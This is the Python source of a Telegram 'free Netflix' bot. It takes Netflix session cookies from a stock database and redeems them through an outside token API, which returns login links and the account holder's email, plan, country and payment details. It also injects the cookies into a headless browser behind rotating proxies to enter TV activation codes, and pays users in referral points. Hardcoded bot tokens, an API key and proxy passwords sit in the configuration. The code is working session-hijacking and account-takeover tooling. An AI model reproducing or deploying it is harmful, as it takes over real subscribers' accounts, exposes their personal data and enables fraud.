import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import sqlite3
import threading
import json as _json
import asyncio
import tempfile
import os
import logging
import zipfile
import io

from playwright.async_api import async_playwright

logger = logging.getLogger(__name__)

# ==========================================
# CONFIGURATION
# ==========================================
TELEGRAM_BOT_TOKEN = "8267120265:AAHA70BSmHfcfZEfYZsupARB1RLEDT5HAiA"
NFTOKEN_API_KEY    = "NFK_dda3ee3932171d33d94067e3"
API_URL            = "https://nftoken.site/v1/api.php"

MUST_JOIN_CHANNELS = [
    {"name": "Channel 1", "url": "https://t.me/netflixgiveawayx",  "id": "@netflixgiveawayx"},
    {"name": "Channel 2", "url": "https://t.me/zwdxmoneymax",      "id": "@zwdxmoneymax"},
    {"name": "Channel 3", "url": "https://t.me/RiyalLooters",      "id": "@RiyalLooters"},
    {"name": "Channel 4", "url": "https://t.me/sheintrickss",      "id": "@sheintrickss"},
]

STOCK_CHANNEL_ID  = -1003755778558
PUBLIC_CHANNEL_ID = -1003870302189
ADMIN_IDS         = {7998012491}
SUPPORT_USERNAME  = "@netflixgiveawayx"

# PROMO_CODES is now seeded from DB at startup; runtime codes also stored in DB.
# We keep a small in-memory dict as cache — refreshed from DB each /promo use.
_BUILTIN_PROMOS = {
    "VEDVIT":   1000000,
    "VEDVITOP": 1,
    "TV": 2,
}

DEVICES = {
    "mobile": {"label": "📱 Mobile", "cost": 1},
    "pc":     {"label": "💻 PC",     "cost": 2},
    "tv":     {"label": "📺 TV",     "cost": 3},
}

DB_PATH = "cookie4.db"

TV_URL          = "https://www.netflix.com/tv9"
CODE_SELECTOR   = "input[data-uia='input-text-with-label']"
CODE_FALLBACKS  = [
    "input[autocomplete='one-time-code']",
    "input[name='code']",
    "input[maxlength='8']",
    "input[maxlength='1']",
    "input[type='tel']",
    "input[type='text']",
    "[data-uia='pin-input-field'] input",
    ".pin-input input",
]
SUBMIT_SELECTOR  = "button[data-uia='sign-in-form-submit-btn']"
SUBMIT_FALLBACKS = [
    "button[type='submit']",
    "button[data-uia='action-btn']",
    "[data-uia='login-submit-button']",
    "button:has-text('Continue')",
    "button:has-text('Next')",
]
HEADLESS = True

_pending_tv: dict = {}

# ==========================================
# PROXY ROTATION (TV LOGIN ONLY)
# ==========================================
_RAW_PROXIES = [
    "31.59.20.176:6754:sunyxylf:jcpmdb5nd5tu",
    "23.95.150.145:6114:sunyxylf:jcpmdb5nd5tu",
    "198.23.239.134:6540:sunyxylf:jcpmdb5nd5tu",
    "45.38.107.97:6014:sunyxylf:jcpmdb5nd5tu",
    "107.172.163.27:6543:sunyxylf:jcpmdb5nd5tu",
    "198.105.121.200:6462:sunyxylf:jcpmdb5nd5tu",
    "216.10.27.159:6837:sunyxylf:jcpmdb5nd5tu",
    "142.111.67.146:5611:sunyxylf:jcpmdb5nd5tu",
    "191.96.254.138:6185:sunyxylf:jcpmdb5nd5tu",
    "31.58.9.4:6077:sunyxylf:jcpmdb5nd5tu",
]

def _parse_proxy(raw: str) -> dict | None:
    try:
        ip, port, user, pwd = raw.strip().split(":")
        return {"server": f"http://{ip}:{port}", "username": user, "password": pwd}
    except Exception:
        return None

_PROXY_LIST: list[dict] = [p for raw in _RAW_PROXIES if (p := _parse_proxy(raw))]
_proxy_lock  = threading.Lock()
_proxy_index = 0
_dead_proxies: set = set()

def _get_next_proxy() -> dict | None:
    global _proxy_index
    with _proxy_lock:
        total = len(_PROXY_LIST)
        for _ in range(total):
            proxy = _PROXY_LIST[_proxy_index % total]
            _proxy_index = (_proxy_index + 1) % total
            if proxy["server"] not in _dead_proxies:
                return proxy
        return None

def _mark_proxy_dead(proxy: dict):
    if proxy:
        _dead_proxies.add(proxy["server"])
        print(f"[PROXY] Marked dead: {proxy['server']}  ({len(_dead_proxies)}/{len(_PROXY_LIST)} dead)")

# ==========================================
# COOKIE FORMAT CONVERTER
# ==========================================

def _is_cookie_text(text: str) -> bool:
    t = text.lower()
    return (
        "netflix" in t or
        "netflixid" in t.replace(" ", "") or
        "securenetflixid" in t.replace(" ", "") or
        (text.strip().startswith("[") and "netflix" in t)
    )

def parse_cookies_for_playwright(raw: str) -> list[dict]:
    raw = raw.strip()
    if raw.startswith("["):
        try:
            cookies = _json.loads(raw)
            if isinstance(cookies, list):
                result = []
                for c in cookies:
                    name  = c.get("name")  or c.get("Name",  "")
                    value = c.get("value") or c.get("Value", "")
                    if not name:
                        continue
                    entry = {
                        "name":   name,
                        "value":  value,
                        "domain": c.get("domain", ".netflix.com"),
                        "path":   c.get("path", "/"),
                    }
                    exp = c.get("expires") or c.get("expirationDate") or c.get("expiration")
                    if exp and exp != -1:
                        try:
                            entry["expires"] = float(exp)
                        except Exception:
                            pass
                    if "httpOnly" in c:
                        entry["httpOnly"] = bool(c["httpOnly"])
                    if "secure" in c:
                        entry["secure"] = bool(c["secure"])
                    ss = c.get("sameSite") or c.get("samesite")
                    if ss in ("Strict", "Lax", "None"):
                        entry["sameSite"] = ss
                    result.append(entry)
                if result:
                    return result
        except Exception:
            pass
    lines = [l.strip() for l in raw.replace("|", "\n").splitlines() if l.strip()]
    netscape = []
    for line in lines:
        cols = line.split("\t")
        if len(cols) >= 7 and "netflix" in cols[0].lower():
            domain, _, path, secure, expires, name, value = cols[:7]
            entry = {
                "name":   name.strip(),
                "value":  value.strip(),
                "domain": domain.strip(),
                "path":   path.strip() or "/",
                "secure": secure.strip().upper() == "TRUE",
            }
            if expires.strip().isdigit():
                entry["expires"] = float(expires.strip())
            netscape.append(entry)
    if netscape:
        return netscape
    result = []
    for chunk in raw.replace("\n", ";").split(";"):
        chunk = chunk.strip()
        if "=" in chunk:
            name, _, value = chunk.partition("=")
            result.append({
                "name":   name.strip(),
                "value":  value.strip(),
                "domain": ".netflix.com",
                "path":   "/",
            })
    return result


# ==========================================
# PLAYWRIGHT TV AUTOMATION
# ==========================================

async def _tv_activate_async(cookie_raw: str, code: str, proxy: dict | None) -> tuple[bool, str]:
    cookies = parse_cookies_for_playwright(cookie_raw)
    if not cookies:
        raise ValueError("No valid cookies found in this slot.")

    screenshot_path = tempfile.mktemp(suffix=".png")
    launch_kwargs = {
        "headless": HEADLESS,
        "args": ["--no-sandbox", "--disable-dev-shm-usage"],
    }
    if proxy:
        launch_kwargs["proxy"] = proxy

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(**launch_kwargs)
        ctx = await browser.new_context(
            viewport={"width": 1280, "height": 800},
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/124.0.0.0 Safari/537.36"
            ),
        )
        page = await ctx.new_page()
        try:
            await ctx.add_cookies(cookies)
            await page.goto(TV_URL, wait_until="networkidle", timeout=30_000)

            all_selectors = [CODE_SELECTOR] + CODE_FALLBACKS
            matched = None
            for sel in all_selectors:
                try:
                    await page.wait_for_selector(sel, state="visible", timeout=6_000)
                    matched = sel
                    break
                except Exception:
                    continue

            if not matched:
                await page.screenshot(path=screenshot_path, full_page=False)
                return False, screenshot_path

            inputs = await page.query_selector_all(matched)
            if len(inputs) > 1:
                for i, digit in enumerate(code):
                    if i < len(inputs):
                        await inputs[i].click()
                        await inputs[i].fill(digit)
                        await page.wait_for_timeout(100)
            else:
                await page.fill(matched, "")
                await page.type(matched, code, delay=80)

            all_submit = [SUBMIT_SELECTOR] + SUBMIT_FALLBACKS
            submitted  = False
            for sel in all_submit:
                try:
                    await page.wait_for_selector(sel, state="visible", timeout=5_000)
                    await page.click(sel)
                    submitted = True
                    break
                except Exception:
                    continue
            if not submitted:
                await page.press(matched, "Enter")

            try:
                await page.wait_for_load_state("networkidle", timeout=15_000)
            except Exception:
                pass

            await page.screenshot(path=screenshot_path, full_page=False)
            return True, screenshot_path

        finally:
            await ctx.close()
            await browser.close()


def tv_activate_sync(cookie_raw: str, code: str, proxy: dict | None) -> tuple[bool, str]:
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(_tv_activate_async(cookie_raw, code, proxy))
    finally:
        loop.close()


# ==========================================
# DATABASE
# ==========================================

_local = threading.local()

def get_conn():
    if not hasattr(_local, "conn") or _local.conn is None:
        _local.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        _local.conn.execute("PRAGMA journal_mode=WAL")
        _local.conn.execute("PRAGMA foreign_keys=ON")
    return _local.conn

# ── Schema version — bump only when adding NEW tables/columns,
#    NEVER drop existing tables so user data survives restarts. ──
SCHEMA_VERSION = 5

def _get_schema_version(conn) -> int:
    conn.execute("CREATE TABLE IF NOT EXISTS _meta (key TEXT PRIMARY KEY, value TEXT)")
    row = conn.execute("SELECT value FROM _meta WHERE key='schema_version'").fetchone()
    return int(row[0]) if row else 0

def _set_schema_version(conn, v: int):
    conn.execute(
        "INSERT OR REPLACE INTO _meta (key, value) VALUES ('schema_version', ?)", (str(v),)
    )

def init_db():
    conn = get_conn()
    current = _get_schema_version(conn)

    # Create all tables idempotently — never DROP to protect user points.
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            uid     INTEGER PRIMARY KEY,
            points  INTEGER NOT NULL DEFAULT 0,
            joined  INTEGER NOT NULL DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS referrals (
            referrer_uid  INTEGER NOT NULL,
            referred_uid  INTEGER NOT NULL,
            PRIMARY KEY (referrer_uid, referred_uid)
        );
        CREATE TABLE IF NOT EXISTS pending_refs (
            new_uid      INTEGER PRIMARY KEY,
            referrer_uid INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS stock (
            id      INTEGER PRIMARY KEY AUTOINCREMENT,
            cookie  TEXT NOT NULL,
            msg_id  INTEGER DEFAULT NULL
        );
        CREATE TABLE IF NOT EXISTS used_cookies (
            id     INTEGER PRIMARY KEY AUTOINCREMENT,
            cookie TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS used_promos (
            uid  INTEGER NOT NULL,
            code TEXT NOT NULL,
            PRIMARY KEY (uid, code)
        );
        CREATE TABLE IF NOT EXISTS promo_codes (
            code   TEXT PRIMARY KEY,
            points INTEGER NOT NULL
        );
        CREATE TABLE IF NOT EXISTS referral_penalties (
            referrer_uid  INTEGER NOT NULL,
            referred_uid  INTEGER NOT NULL,
            channel_id    TEXT    NOT NULL,
            PRIMARY KEY (referrer_uid, referred_uid, channel_id)
        );
    """)

    # Seed built-in promos (INSERT OR IGNORE so existing ones aren't overwritten)
    for code, pts in _BUILTIN_PROMOS.items():
        conn.execute(
            "INSERT OR IGNORE INTO promo_codes (code, points) VALUES (?, ?)", (code, pts)
        )

    _set_schema_version(conn, SCHEMA_VERSION)
    conn.commit()
    print(f"[DB] Ready (schema v{SCHEMA_VERSION}) — user data preserved.")

# ==========================================
# STORAGE HELPERS
# ==========================================

def _ensure_user(uid: int):
    conn = get_conn()
    conn.execute("INSERT OR IGNORE INTO users (uid) VALUES (?)", (uid,))
    conn.commit()

def get_points(uid: int) -> int:
    _ensure_user(uid)
    return (get_conn().execute("SELECT points FROM users WHERE uid=?", (uid,)).fetchone() or (0,))[0]

def add_points(uid: int, n: int) -> int:
    _ensure_user(uid)
    conn = get_conn()
    conn.execute("UPDATE users SET points = points + ? WHERE uid=?", (n, uid))
    conn.commit()
    return get_points(uid)

def deduct_points(uid: int, n: int) -> int:
    _ensure_user(uid)
    conn = get_conn()
    conn.execute("UPDATE users SET points = MAX(0, points - ?) WHERE uid=?", (n, uid))
    conn.commit()
    return get_points(uid)

def get_referrals(uid: int) -> int:
    return (get_conn().execute(
        "SELECT COUNT(*) FROM referrals WHERE referrer_uid=?", (uid,)
    ).fetchone() or (0,))[0]

def add_referral(referrer_uid: int, new_uid: int) -> bool:
    try:
        conn = get_conn()
        conn.execute(
            "INSERT INTO referrals (referrer_uid, referred_uid) VALUES (?,?)",
            (referrer_uid, new_uid)
        )
        conn.commit()
        return True
    except sqlite3.IntegrityError:
        return False

def remove_referral(referrer_uid: int, referred_uid: int) -> bool:
    """Remove referral link when referred user leaves a channel. Returns True if row existed."""
    conn = get_conn()
    cur = conn.execute(
        "DELETE FROM referrals WHERE referrer_uid=? AND referred_uid=?",
        (referrer_uid, referred_uid)
    )
    conn.commit()
    return cur.rowcount > 0

def get_referrer_of(uid: int):
    """Return the referrer_uid for a given referred user, or None."""
    row = get_conn().execute(
        "SELECT referrer_uid FROM referrals WHERE referred_uid=?", (uid,)
    ).fetchone()
    return row[0] if row else None

def has_penalty(referrer_uid: int, referred_uid: int, channel_id: str) -> bool:
    return get_conn().execute(
        "SELECT 1 FROM referral_penalties WHERE referrer_uid=? AND referred_uid=? AND channel_id=?",
        (referrer_uid, referred_uid, channel_id)
    ).fetchone() is not None

def add_penalty(referrer_uid: int, referred_uid: int, channel_id: str):
    conn = get_conn()
    conn.execute(
        "INSERT OR IGNORE INTO referral_penalties (referrer_uid, referred_uid, channel_id) VALUES (?,?,?)",
        (referrer_uid, referred_uid, channel_id)
    )
    conn.commit()

def remove_penalty(referrer_uid: int, referred_uid: int, channel_id: str):
    """Clear a penalty when the user rejoins, so leaving again can penalise again."""
    conn = get_conn()
    conn.execute(
        "DELETE FROM referral_penalties WHERE referrer_uid=? AND referred_uid=? AND channel_id=?",
        (referrer_uid, referred_uid, channel_id)
    )
    conn.commit()

def mark_joined(uid: int):
    _ensure_user(uid)
    conn = get_conn()
    conn.execute("UPDATE users SET joined=1 WHERE uid=?", (uid,))
    conn.commit()

def has_joined_before(uid: int) -> bool:
    _ensure_user(uid)
    row = get_conn().execute("SELECT joined FROM users WHERE uid=?", (uid,)).fetchone()
    return bool(row and row[0])

def set_pending_ref(new_uid: int, referrer_uid: int):
    conn = get_conn()
    conn.execute(
        "INSERT OR REPLACE INTO pending_refs (new_uid, referrer_uid) VALUES (?,?)",
        (new_uid, referrer_uid)
    )
    conn.commit()

def pop_pending_ref(new_uid: int):
    conn = get_conn()
    row = conn.execute(
        "SELECT referrer_uid FROM pending_refs WHERE new_uid=?", (new_uid,)
    ).fetchone()
    if row:
        conn.execute("DELETE FROM pending_refs WHERE new_uid=?", (new_uid,))
        conn.commit()
        return row[0]
    return None

def stock_count() -> int:
    return (get_conn().execute("SELECT COUNT(*) FROM stock").fetchone() or (0,))[0]

def pop_cookie():
    """Remove and return the oldest cookie from stock (also deletes its channel message)."""
    conn = get_conn()
    row = conn.execute("SELECT id, cookie, msg_id FROM stock ORDER BY id LIMIT 1").fetchone()
    if not row:
        return None
    sid, cookie, msg_id = row
    conn.execute("DELETE FROM stock WHERE id=?", (sid,))
    conn.execute("INSERT INTO used_cookies (cookie) VALUES (?)", (cookie,))
    conn.commit()
    if msg_id:
        try:
            bot.delete_message(STOCK_CHANNEL_ID, msg_id)
            print(f"[STOCK] Deleted msg_id={msg_id} from stock channel")
        except Exception as e:
            print(f"[STOCK] Could not delete msg_id={msg_id}: {e}")
    return cookie

def delete_cookie_permanently(cookie: str):
    """Move a dead/unusable cookie to used_cookies without putting it back in stock."""
    conn = get_conn()
    conn.execute("INSERT INTO used_cookies (cookie) VALUES (?)", (cookie,))
    conn.commit()
    print(f"[STOCK] Dead cookie permanently deleted (first 60 chars): {cookie[:60]}")

def push_cookie(cookie: str, msg_id: int = None):
    conn = get_conn()
    conn.execute(
        "INSERT INTO stock (cookie, msg_id) VALUES (?, ?)",
        (cookie.strip(), msg_id)
    )
    conn.commit()

def has_used_promo(uid: int, code: str) -> bool:
    return get_conn().execute(
        "SELECT 1 FROM used_promos WHERE uid=? AND code=?", (uid, code)
    ).fetchone() is not None

def mark_promo_used(uid: int, code: str):
    conn = get_conn()
    conn.execute("INSERT OR IGNORE INTO used_promos (uid, code) VALUES (?,?)", (uid, code))
    conn.commit()

def get_promo(code: str):
    """Returns points for a promo code, or None if not found."""
    row = get_conn().execute(
        "SELECT points FROM promo_codes WHERE code=?", (code,)
    ).fetchone()
    return row[0] if row else None

def create_promo(code: str, points: int) -> bool:
    """Create/update a promo code. Returns True if created, False if already existed."""
    conn = get_conn()
    existing = conn.execute("SELECT 1 FROM promo_codes WHERE code=?", (code,)).fetchone()
    conn.execute(
        "INSERT OR REPLACE INTO promo_codes (code, points) VALUES (?,?)", (code, points)
    )
    conn.commit()
    return existing is None

# ==========================================
# BOT SETUP
# ==========================================

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
PINNED_MSG = {}

def update_stock_pin():
    count = stock_count()
    text  = (
        f"📦 *Live Netflix Stock*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"✅ Available: `{count}` account{'s' if count != 1 else ''}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Start the bot → /start"
    )
    mid = PINNED_MSG.get(PUBLIC_CHANNEL_ID)
    try:
        if mid:
            bot.edit_message_text(text, PUBLIC_CHANNEL_ID, mid, parse_mode="Markdown")
        else:
            msg = bot.send_message(PUBLIC_CHANNEL_ID, text, parse_mode="Markdown")
            bot.pin_chat_message(PUBLIC_CHANNEL_ID, msg.message_id, disable_notification=True)
            PINNED_MSG[PUBLIC_CHANNEL_ID] = msg.message_id
    except Exception:
        pass

def check_membership(uid: int):
    not_joined = []
    for ch in MUST_JOIN_CHANNELS:
        try:
            member = bot.get_chat_member(ch["id"], uid)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch)
        except Exception:
            not_joined.append(ch)
    return not_joined

def must_join_markup(not_joined):
    not_joined_ids = {ch["id"] for ch in not_joined}
    markup = InlineKeyboardMarkup()
    row = []
    for ch in MUST_JOIN_CHANNELS:
        emoji = "🥀" if ch["id"] in not_joined_ids else "✅"
        row.append(InlineKeyboardButton(f"{emoji} {ch['name']}", url=ch["url"]))
        if len(row) == 2:
            markup.row(*row)
            row = []
    if row:
        markup.row(*row)
    markup.row(InlineKeyboardButton("☑️  VERIFY ACCESS", callback_data="verify_access"))
    return markup

def main_menu_text(uid: int) -> str:
    try:
        u    = bot.get_chat(uid)
        name = u.first_name or u.username or str(uid)
    except Exception:
        name = str(uid)
    pts  = get_points(uid)
    refs = get_referrals(uid)
    bot_info    = bot.get_me()
    invite_link = f"https://t.me/{bot_info.username}?start=ref_{uid}"
    return (
        f"🎁 *WELCOME TO FREE NETFLIX BOT*\n\n"
        f"💎 *REFER AND GET*\n"
        f"{'─' * 28}\n\n"
        f"👤 User: {name}\n"
        f"🆔 UID: `{uid}`\n\n"
        f"💎 Balance: `{pts} pts`\n"
        f"🤝 Referrals: `{refs}`\n\n"
        f"🔗 Invite Link:\n`{invite_link}`\n\n"
        f"{'─' * 28}\n"
        f"💵 _Earn more by inviting friends_"
    )

def main_menu_markup(uid: int):
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🎁  REDEEM", callback_data=f"open_redeem:{uid}"))
    markup.row(
        InlineKeyboardButton("📊  Invite & Earn", callback_data=f"invite_earn:{uid}"),
        InlineKeyboardButton("🎟  Promocode",     callback_data=f"promocode:{uid}"),
    )
    markup.row(InlineKeyboardButton("🆘  Support", url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}"))
    return markup

def _award_referral(uid: int, ref_id):
    if ref_id and ref_id != uid:
        if add_referral(ref_id, uid):
            new_pts = add_points(ref_id, 1)
            try:
                bot.send_message(
                    ref_id,
                    f"🎉 Your friend joined channels. *+1 Credit added!*\n"
                    f"💎 Balance: `{new_pts} pts`",
                    parse_mode="Markdown"
                )
            except Exception:
                pass

# ==========================================
# HANDLERS
# ==========================================

@bot.message_handler(commands=["start"])
def cmd_start(message):
    uid         = message.from_user.id
    parts       = message.text.strip().split()
    referrer_id = None
    if len(parts) > 1 and parts[1].startswith("ref_"):
        try:
            referrer_id = int(parts[1].split("_")[1])
            if referrer_id == uid:
                referrer_id = None
        except Exception:
            pass

    not_joined = check_membership(uid)
    if not_joined:
        if referrer_id:
            set_pending_ref(uid, referrer_id)
        bot.send_message(
            message.chat.id,
            "🚀 *PREMIUM ACCESS BOT*\n\nJoin all channels and click *Verify* to start.",
            parse_mode="Markdown",
            reply_markup=must_join_markup(not_joined)
        )
        return

    if not has_joined_before(uid):
        mark_joined(uid)
        ref_id = pop_pending_ref(uid) or referrer_id
        _award_referral(uid, ref_id)

    bot.send_message(
        message.chat.id,
        main_menu_text(uid),
        parse_mode="Markdown",
        reply_markup=main_menu_markup(uid)
    )

@bot.callback_query_handler(func=lambda c: c.data == "verify_access")
def cb_verify(call):
    uid        = call.from_user.id
    not_joined = check_membership(uid)
    if not_joined:
        bot.answer_callback_query(call.id, "")
        try:
            bot.edit_message_reply_markup(
                call.message.chat.id, call.message.message_id,
                reply_markup=must_join_markup(not_joined)
            )
        except Exception:
            pass
        bot.send_message(
            call.message.chat.id,
            "❌ *Verification Failed!*\nPlease join all channels and try again.",
            parse_mode="Markdown"
        )
        return

    bot.answer_callback_query(call.id, "✅ Verified!")
    if not has_joined_before(uid):
        mark_joined(uid)
        ref_id = pop_pending_ref(uid)
        _award_referral(uid, ref_id)

    try:
        bot.edit_message_text(
            main_menu_text(uid),
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown",
            reply_markup=main_menu_markup(uid)
        )
    except Exception:
        bot.send_message(
            call.message.chat.id,
            main_menu_text(uid),
            parse_mode="Markdown",
            reply_markup=main_menu_markup(uid)
        )

@bot.callback_query_handler(func=lambda c: c.data.startswith("open_redeem:"))
def cb_open_redeem(call):
    uid = call.from_user.id
    pts = get_points(uid)
    cnt = stock_count()
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("📱 Mobile  1pt",  callback_data=f"redeem:mobile:{uid}"),
        InlineKeyboardButton("💻 PC  2pts",     callback_data=f"redeem:pc:{uid}"),
        InlineKeyboardButton("📺 TV  3pts",     callback_data=f"redeem:tv:{uid}"),
    )
    markup.row(InlineKeyboardButton("🔙 Back to Menu", callback_data=f"back_menu:{uid}"))
    try:
        bot.edit_message_text(
            f"🎁 *REDEEM YOUR POINTS*\n"
            f"{'─' * 28}\n\n"
            f"💎 Your balance: `{pts} pts`\n"
            f"📦 Stock available: `{cnt}`\n\n"
            f"Choose your device to get a Netflix login link:",
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown",
            reply_markup=markup
        )
    except Exception:
        pass
    bot.answer_callback_query(call.id, "")

@bot.callback_query_handler(func=lambda c: c.data.startswith("redeem:"))
def cb_redeem_device(call):
    parts  = call.data.split(":")
    device = parts[1]
    uid    = call.from_user.id

    if uid != int(parts[2]):
        bot.answer_callback_query(call.id, "⚠️ Not your session.", show_alert=False)
        return

    cfg  = DEVICES[device]
    cost = cfg["cost"]
    pts  = get_points(uid)

    if pts < cost:
        bot.answer_callback_query(
            call.id,
            f"❌ Need {cost} pt{'s' if cost > 1 else ''}, you have {pts}.",
            show_alert=True
        )
        return

    if stock_count() == 0:
        bot.answer_callback_query(call.id, "😔 No stock available right now.", show_alert=True)
        return

    bot.answer_callback_query(call.id, "⏳ Processing…")

    # ── Mobile — Not Available Yet ────────────────────────────────────────────
    if device == "mobile":
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("🔙 Back to Menu", callback_data=f"back_menu:{uid}"))
        try:
            bot.edit_message_text(
                f"📱 *Mobile Login*\n{'─' * 28}\n\n"
                f"⏳ This feature is *not available yet*.\n"
                f"Coming soon — stay tuned! 🚀",
                call.message.chat.id, call.message.message_id,
                parse_mode="Markdown",
                reply_markup=markup
            )
        except Exception:
            pass
        return

    # ── TV ────────────────────────────────────────────────────────────────────
    if device == "tv":
        cookie = pop_cookie()
        if not cookie:
            bot.send_message(call.message.chat.id, "😔 Stock just ran out. Try again later.")
            return
        deduct_points(uid, cost)
        update_stock_pin()
        _pending_tv[uid] = {"cookie": cookie, "cost": cost}
        try:
            bot.edit_message_text(
                f"📺 *TV Activation*\n{'─' * 28}\n\n"
                f"💎 *3 pts deducted.* Balance: `{get_points(uid)} pts`\n\n"
                f"📟 Now send the *8-digit code* shown on your Netflix TV screen:",
                call.message.chat.id, call.message.message_id,
                parse_mode="Markdown"
            )
        except Exception:
            bot.send_message(
                call.message.chat.id,
                "📺 *TV Activation* — 3 pts deducted.\n\n📟 Send the *8-digit code*:",
                parse_mode="Markdown"
            )
        return

    # ── PC — auto-retry until success, dead cookies permanently deleted ───────
    try:
        bot.edit_message_text(
            "⏳ *Fetching account and generating your link…*",
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown"
        )
    except Exception:
        pass

    def run_pc_redeem():
        MAX_TRIES = 10  # try up to 10 cookies before giving up
        attempt   = 0

        while attempt < MAX_TRIES:
            attempt += 1
            if stock_count() == 0:
                try:
                    bot.edit_message_text(
                        "😔 *Stock ran out before a working account was found.*\n"
                        f"Points were *not* deducted.\n\n"
                        f"💎 Balance: `{get_points(uid)} pts`",
                        call.message.chat.id, call.message.message_id,
                        parse_mode="Markdown",
                        reply_markup=main_menu_markup(uid)
                    )
                except Exception:
                    pass
                return

            cookie = pop_cookie()
            if not cookie:
                break

            update_stock_pin()
            print(f"[REDEEM-PC] uid={uid} attempt={attempt} cookie={cookie[:60]}")

            try:
                response = requests.post(
                    API_URL,
                    json={"key": NFTOKEN_API_KEY, "cookie": cookie.strip()},
                    timeout=20
                )
                data = response.json()
                status = data.get("status")
                print(f"[REDEEM-PC] status={status} attempt={attempt}")

                if status == "SUCCESS":
                    # ✅ Working cookie — deduct points and deliver
                    remaining_pts = deduct_points(uid, cost)
                    link     = data.get("x_l1", "#")
                    stock    = stock_count()
                    email    = data.get("x_mail", "N/A")
                    plan     = data.get("x_tier", "Unknown")
                    country  = data.get("x_loc",  "N/A")
                    renewal  = data.get("x_ren",  "N/A")
                    since    = data.get("x_mem",  "N/A")
                    payment  = data.get("x_bil",  "N/A")
                    profiles = data.get("x_usr",  "N/A")

                    markup = InlineKeyboardMarkup()
                    if link.startswith("http"):
                        markup.row(InlineKeyboardButton("💻 Open on PC", url=link))
                    markup.row(InlineKeyboardButton("🔙  BACK TO MENU", callback_data=f"back_menu:{uid}"))

                    try:
                        bot.edit_message_text(
                            f"✅ *NETFLIX CLAIM SUCCESSFUL*\n"
                            f"{'═' * 26}\n\n"
                            f"📧 *Email:*    `{email}`\n"
                            f"🎬 *Plan:*     `{plan}`\n"
                            f"🌍 *Country:*  `{country}`\n"
                            f"📅 *Renewal:*  `{renewal}`\n"
                            f"⏳ *Since:*    `{since}`\n"
                            f"💳 *Payment:*  `{payment}`\n"
                            f"👥 *Profiles:* `{profiles}`\n\n"
                            f"{'═' * 26}\n"
                            f"💎 Balance: `{remaining_pts} pts` | 📦 Stock: `{stock}`\n\n"
                            f"_Tap the button below to login._",
                            call.message.chat.id, call.message.message_id,
                            parse_mode="Markdown",
                            reply_markup=markup
                        )
                    except Exception:
                        pass
                    return  # ✅ Done

                else:
                    # ❌ Dead cookie — permanently delete, try next
                    delete_cookie_permanently(cookie)
                    update_stock_pin()
                    print(f"[REDEEM-PC] Dead cookie on attempt {attempt}, trying next…")
                    try:
                        bot.edit_message_text(
                            f"🔄 *Checking accounts… (attempt {attempt})*\n"
                            f"_Dead account found, trying next…_",
                            call.message.chat.id, call.message.message_id,
                            parse_mode="Markdown"
                        )
                    except Exception:
                        pass
                    continue  # loop to next cookie

            except Exception as e:
                print(f"[REDEEM-PC] API error on attempt {attempt}: {e}")
                # On API error, put cookie back and try next
                push_cookie(cookie)
                update_stock_pin()
                continue

        # All attempts exhausted
        try:
            bot.edit_message_text(
                f"😔 *No working accounts found after {attempt} attempt(s).*\n"
                f"Points were *not* deducted.\n\n"
                f"💎 Balance: `{get_points(uid)} pts`",
                call.message.chat.id, call.message.message_id,
                parse_mode="Markdown",
                reply_markup=main_menu_markup(uid)
            )
        except Exception:
            pass

    threading.Thread(target=run_pc_redeem, daemon=True).start()


# ── TV code handler ───────────────────────────────────────────────────────────

@bot.message_handler(func=lambda m: m.from_user.id in _pending_tv and m.content_type == "text")
def handle_tv_code(message):
    uid  = message.from_user.id
    code = message.text.strip()
    if not code.isdigit() or len(code) != 8:
        bot.reply_to(message, "⚠️ Please send a valid *8-digit* numeric code.", parse_mode="Markdown")
        return

    session    = _pending_tv.pop(uid)
    cookie     = session["cookie"]
    status_msg = bot.reply_to(message, "🤖 Starting browser…")

    def run_activation():
        MAX_TRIES       = 3
        current_cookie  = cookie
        screenshot_path = None
        attempt         = 0

        while attempt < MAX_TRIES:
            attempt += 1
            screenshot_path = None

            proxy = _get_next_proxy()
            proxy_label = proxy["server"] if proxy else "direct (Railway IP)"
            print(f"[TV] attempt={attempt}/{MAX_TRIES}  proxy={proxy_label}")

            try:
                status_text = (
                    f"🍪 Injecting cookies… (proxy {attempt}/10)"
                    if attempt == 1
                    else f"🔄 Trying another account (attempt {attempt}/{MAX_TRIES})…"
                )
                try:
                    bot.edit_message_text(status_text, message.chat.id, status_msg.message_id)
                except Exception:
                    pass

                success, screenshot_path = tv_activate_sync(current_cookie, code, proxy)

                caption = (
                    f"✅ *TV Activation Successful!*\n\nCode `{code}` entered.\n"
                    f"💎 Balance: `{get_points(uid)} pts`"
                    if success else
                    f"⚠️ *Code field not found — see screenshot.*\n"
                    f"💎 Balance: `{get_points(uid)} pts`"
                )
                try:
                    bot.delete_message(message.chat.id, status_msg.message_id)
                except Exception:
                    pass
                with open(screenshot_path, "rb") as sc:
                    bot.send_photo(
                        message.chat.id, sc,
                        caption=caption,
                        parse_mode="Markdown",
                        reply_markup=main_menu_markup(uid)
                    )
                return

            except Exception as e:
                err_str = str(e).lower()
                print(f"[TV] attempt={attempt} proxy={proxy_label} error: {e}")

                if proxy and any(k in err_str for k in (
                    "proxy", "connect", "timeout", "refused", "407", "403", "ssl"
                )):
                    _mark_proxy_dead(proxy)

                if screenshot_path and os.path.exists(screenshot_path):
                    try:
                        os.unlink(screenshot_path)
                    except Exception:
                        pass

